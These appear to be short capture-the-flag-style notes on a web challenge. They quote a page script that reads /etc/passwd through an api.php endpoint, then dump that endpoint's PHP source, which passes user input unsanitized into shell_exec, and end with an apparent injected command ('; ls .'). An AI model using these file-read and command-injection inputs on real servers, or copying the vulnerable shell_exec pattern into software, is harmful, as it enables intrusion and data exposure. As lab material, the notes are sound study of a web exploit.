1. script in <body>
```js
    const squirrelFile = '/etc/passwd';

    fetch('api.php?get=' + encodeURIComponent(squirrelFile))
      .then(res => res.json())
      .then(data => {
        if ('error' in data) {
          throw data.error;
        }
        data.output.split('\n')
          .map(line => line.split(':')[0].trim())
          .filter(name => name.length)
          .forEach(name => new Squirrel(name).update());
      })
      .catch(err => {
        console.log(err);
        alert('Something went wrong! Please report this to the author!');
      });
```

2. try `get=.%2Fapi.php`
```php
{"output":"<?php

header('Content-Type: application\/json');

if ($file = @$_GET['get']) {
    $output = shell_exec(\"cat '$file'\");\n    
    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
    } else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
    }
"}api.php; ls .
```

